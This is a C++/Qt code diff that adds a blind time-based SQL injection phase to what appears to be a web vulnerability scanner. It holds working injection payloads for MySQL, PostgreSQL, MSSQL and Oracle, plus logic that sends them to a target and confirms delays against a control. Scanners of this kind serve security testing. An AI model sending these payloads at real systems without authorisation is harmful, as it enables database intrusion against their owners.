@@ -1,7 +1,9 @@
 #include "sql_injection.hpp"
 #include "networking.hpp"
 
+#include <QElapsedTimer>
 #include <QRegularExpression>
+#include <QSet>
 #include <QUrl>
 #include <QUrlQuery>
 
@@ -74,6 +76,25 @@ QString queryWith(const QString &existing, const QString &param, const QString &
     return parts.join('&');
 }
 
+// Blind time-based payloads, per DBMS. %1 is the sleep seconds, so the same
+// shape gives a SLEEP(N) probe and a SLEEP(0) control -- if the delay tracks N
+// (and the 0-control doesn't stall) the injected SQL ran.
+struct TimePayload { const char *dbms; const char *tmpl; };
+const QList<TimePayload> &timePayloads() {
+    static const QList<TimePayload> p = {
+        { "MySQL",      "'-(SELECT SLEEP(%1))-'" },
+        { "MySQL",      "1 OR SLEEP(%1)-- -" },
+        { "PostgreSQL", "';SELECT pg_sleep(%1)-- -" },
+        { "PostgreSQL", "1 OR (SELECT 1 FROM pg_sleep(%1))-- -" },
+        { "MSSQL",      "1;WAITFOR DELAY '0:0:%1'-- -" },
+        { "MSSQL",      "';WAITFOR DELAY '0:0:%1'-- -" },
+        { "Oracle",     "1 OR dbms_pipe.receive_message('a',%1)-- -" },
+    };
+    return p;
+}
+constexpr int kSleepSeconds    = 5;
+constexpr int kTimeThresholdMs = 4000;   // delay over baseline that signals a sleep ran
+
 } // namespace
 
 QStringList defaultParams() {
@@ -122,9 +143,9 @@ Result test(const Request &reqIn) {
         { "';",   "'';" },   // balanced must even out the quote count, not just append --
     };
 
+    QSet<QString> confirmedParams;
     for (const QString &param : params) {
         if (result.requestsSent >= kMaxSends) break;
-        bool paramHit = false;
         for (const Probe &p : probes) {
             if (result.requestsSent >= kMaxSends) break;
             const auto r = send(queryWith(req.query, param, QString::fromUtf8(p.breaker)));
@@ -139,12 +160,61 @@ Result test(const Request &reqIn) {
             // Require the balanced payload to succeed AND clear the error. A
             // failed balanced request can't corroborate, so don't confirm on it.
             if (!rb.ok || !matchError(rb.parsed.body).first.isEmpty()) continue;
-            result.hits.append({ param, err.first, QString::fromUtf8(p.breaker), err.second });
+            result.hits.append({ param, err.first, QStringLiteral("error-based"),
+                                 QString::fromUtf8(p.breaker), err.second });
             result.vulnerable = true;
-            paramHit = true;
+            confirmedParams.insert(param);
             break;
         }
-        if (paramHit) continue;
+    }
+
+    // ---- Blind time-based phase (opt-in; slow) ----
+    // For params not already confirmed error-based, inject a SLEEP(N) and flag
+    // when the response is delayed by ~N seconds AND a SLEEP(0) control of the
+    // same shape is NOT delayed (rules out a generally slow/tarpitting server),
+    // with the delay reproducing on a re-send.
+    if (req.timeBased && result.requestsSent + 2 <= kMaxSends) {
+        // A timed send that returns BOTH the elapsed ms and whether it actually
+        // completed -- a transport timeout (ok=false, ~15s) must never be
+        // counted as a SLEEP delay, so callers gate hits on ok.
+        struct Timed { int ms; bool ok; };
+        auto timed = [&](const QString &param, const QString &val) -> Timed {
+            QElapsedTimer t; t.start();
+            ++result.requestsSent;
+            const auto r = client.send(req.host, port, req.tls,
+                                       buildRequest(req, queryWith(req.query, param, val)));
+            return { static_cast<int>(t.elapsed()), r.ok };
+        };
+        // Quick timing baseline (the error-phase baseline body was for text).
+        const int tb1 = timed(QStringLiteral("x"), QStringLiteral("1")).ms;
+        const int tb2 = timed(QStringLiteral("x"), QStringLiteral("1")).ms;
+        const int timeBaseline = qMin(tb1, tb2);
+        for (const QString &param : params) {
+            if (confirmedParams.contains(param)) continue;
+            if (result.requestsSent + 3 > kMaxSends) break;
+            bool hit = false;
+            for (const TimePayload &tp : timePayloads()) {
+                if (hit || result.requestsSent + 3 > kMaxSends) break;
+                const QString sleepVal = QString::fromUtf8(tp.tmpl).arg(kSleepSeconds);
+                const Timed d1 = timed(param, sleepVal);
+                // The probe must COMPLETE and be delayed -- a timeout (ok=false)
+                // is a stalled connection, not a confirmed SLEEP.
+                if (!d1.ok || d1.ms - timeBaseline < kTimeThresholdMs) continue;
+                // SLEEP(0) control of the same shape must complete AND be fast;
+                // a slow/failed control means the delay isn't sleep-specific.
+                const Timed c = timed(param, QString::fromUtf8(tp.tmpl).arg(0));
+                if (!c.ok || c.ms - timeBaseline >= kTimeThresholdMs) continue;
+                // Reproduce the delay (must also complete and be slow).
+                const Timed d2 = timed(param, sleepVal);
+                if (!d2.ok || d2.ms - timeBaseline < kTimeThresholdMs) continue;
+                result.hits.append({ param, QString::fromUtf8(tp.dbms),
+                    QStringLiteral("time-based"), sleepVal,
+                    QStringLiteral("SLEEP(%1) delayed ~%2ms; SLEEP(0) fast")
+                        .arg(kSleepSeconds).arg(d1.ms - timeBaseline) });
+                result.vulnerable = true;
+                hit = true;
+            }
+        }
     }
 
     return result;
